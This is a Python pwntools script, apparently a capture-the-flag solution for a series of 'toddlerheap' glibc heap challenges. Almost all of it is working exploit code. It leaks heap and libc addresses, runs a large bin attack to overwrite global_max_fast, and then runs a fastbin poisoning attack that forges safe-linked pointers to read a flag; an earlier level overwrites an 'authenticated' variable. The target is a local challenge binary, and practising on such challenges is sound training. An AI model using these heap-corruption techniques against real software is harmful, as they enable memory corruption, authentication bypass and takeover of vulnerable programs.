#!/usr/bin/python
from pwn import *

def prepare(p):
    p.recvuntil(b'quit):')

def malloc_id(p, id: bytes, size: bytes):
    prepare(p)
    p.sendline(b'malloc')
    p.sendline(id)
    p.sendline(size)
    
def free_id(p, id):
    prepare(p)
    p.sendline(b'free')
    p.sendline(id)

def safe_read(p, id, data):
    prepare(p)
    p.sendline(b'safe_read')
    p.sendline(id)
    p.sendline(data)

def puts_id(p, id):
    prepare(p)
    p.sendline(b'puts')
    p.sendline(id)

def read_flag(p):
    prepare(p)
    p.sendline(b'read_flag')

def send_flag(p):
    prepare(p)
    p.sendline(b'send_flag')

def read_id(p, id, size, data):
    prepare(p)
    p.sendline(b'read')
    p.sendline(id)
    p.sendline(size)
    p.send(data)

def level3(p):
    
    malloc_id(p, b'0', b'2100')
    malloc_id(p, b'1', b'1100')

    malloc_id(p, b'2', b'1100')

    free_id(p, b'0')
    free_id(p, b'1')

    
    read_flag(p)

def level3_1(p):
    malloc_id(p, b'0', b'9490')
    malloc_id(p, b'1', b'1100')

    malloc_id(p, b'2', b'1100')

    free_id(p, b'0')
    free_id(p, b'1')

    read_flag(p)

def level4(p):
    authenticated = p64(0x004041c0 - 0x20)

    malloc_id(p, b'0', b'3000')
    malloc_id(p, b'1', b'8000')
    malloc_id(p, b'2', b'4000')
    malloc_id(p, b'3', b'8000')
    free_id(p, b'0')
    free_id(p, b'2')

    puts_id(p, b'2')
    for _ in range(3):
        data = p.recvline()
    heap_addr = u64(data.split(b' ')[1].strip().ljust(8, b'\x00'))
    heap_addr += 0x5a10
    print(hex(heap_addr))

    malloc_id(p, b'4', b'6020')
    malloc_id(p, b'5', b'8000')
    malloc_id(p, b'6', b'6000')
    free_id(p, b'4')
    malloc_id(p, b'7', b'8000')
    
    puts_id(p, b'4')
    for _ in range(3):
        data = p.recvline()
    fd_bk = u64(data.split(b' ')[1].strip().ljust(8, b'\x00'))
    print(hex(fd_bk))

    safe_read(p, b'4', p64(fd_bk) + p64(fd_bk) + p64(heap_addr) + authenticated)
    free_id(p, b'6')
    malloc_id(p, b'8', b'8000')

def level5(p):
    # Get flag address from output
    for _ in range(5):
        data = p.recvline()
        print(data)
    flag_str = b'0'*4 + data.split(b' ')[4][:-2][2:]
    flag = int(flag_str, 16)
    print(f'flag addr: {hex(flag)}')

    # Leak libc addr & calculate addr of global_max_fast
    malloc_id(p, b'0', b'1100')
    malloc_id(p, b'1', b'1100')
    malloc_id(p, b'2', b'1100')
    free_id(p, b'1')
    read_id(p, b'0', b'1120', b'a'*1120)

    puts_id(p, b'0')
    for _ in range(3):
        data = p.recvline()
    libc_addr = u64(data[-7:].strip().ljust(8, b'\x00'))
    global_max_fast = libc_addr + 0x6820
    print(f'global_max_fast: {hex(global_max_fast)}')

    #Clean up damage
    read_id(p, b'0', b'1120', b'a'*1112 + p64(0x460))
    malloc_id(p, b'0', b'1100')
    
    # these are for later ;) fast bin attack
    malloc_id(p, b'10', b'1100')
    malloc_id(p, b'11', b'1470')
    malloc_id(p, b'12', b'8000')
    malloc_id(p, b'13', b'1470')
    malloc_id(p, b'14', b'8000')

    # Begin large bin attack.
    # Before finishing write to global_max_fast, have "fastbin" entried already malloc'd

    malloc_id(p, b'4', b'5200')
    malloc_id(p, b'5', b'5220')
    malloc_id(p, b'6', b'8000')
    malloc_id(p, b'7', b'5200')
    free_id(p, b'5')
    malloc_id(p, b'8', b'8000') # chunk 1 now in large bins

    # Leaking addrs we need to stomp
    read_id(p, b'4', b'5216', b'a'*5216) 
    puts_id(p, b'4')
    for _ in range(3):
        data = p.recvline()
    next_prev = u64(data[-7:].rstrip().ljust(8, b'\x00'))
    print(hex(next_prev))

    read_id(p, b'4', b'5232', b'a'*5232) 
    puts_id(p, b'4')
    for _ in range(3):
        data = p.recvline()
    nsize_psize = u64(data[-7:].rstrip().ljust(8, b'\x00'))
    print(hex(nsize_psize))

    read_id(p, b'4', b'5249', b'a'*5208 + p64(0x1471) + p64(next_prev) + p64(next_prev) + p64(nsize_psize) + p64(global_max_fast - 0x20))
    free_id(p, b'7')
    malloc_id(p, b'9', b'8000')

    ### Free our evil fastbin entries and write flag addr to first's next ptr
    free_id(p, b'13')
    free_id(p, b'11') 

    encoded_flag = (flag - 0x10) ^ ((flag >> 12) + 1)
    read_id(p, b'10', b'1138', b'B'*1112 + p64(0x5d1) + p64(encoded_flag))

    ## allocate twice and print
    malloc_id(p, b'0', b'1470')
    malloc_id(p, b'0', b'1470')
    puts_id(p, b'0')


level = 'level5.1'
p = process(f'/challenge/toddlerheap_{level}')
#p = process(['./ld-2.35.so', f'./toddlerheap_{level}'])
#p = gdb.debug(['./ld-2.35.so',  f'./toddlerheap_{level}'], gdbscript='''
#set max-visualize-chunk-size 100
#c            
#''')


level5(p)
p.interactive()
